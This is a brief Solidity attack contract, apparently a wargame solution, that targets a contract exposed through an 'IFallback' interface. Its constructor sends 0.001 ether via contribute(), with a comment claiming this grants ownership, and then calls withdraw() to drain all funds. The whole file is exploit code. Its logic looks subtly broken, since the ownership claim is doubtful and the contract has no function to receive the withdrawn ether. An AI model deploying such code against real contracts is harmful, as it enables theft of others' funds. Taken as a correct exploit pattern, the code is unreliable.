// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
}

contract Attack {
    IFallback target;

    constructor(IFallback _target) payable {
        target = _target;

        // Contribute 0.001 ether to become the owner
        target.contribute{value: 0.001 ether}();

        // Withdraw all funds
        target.withdraw();
    }
}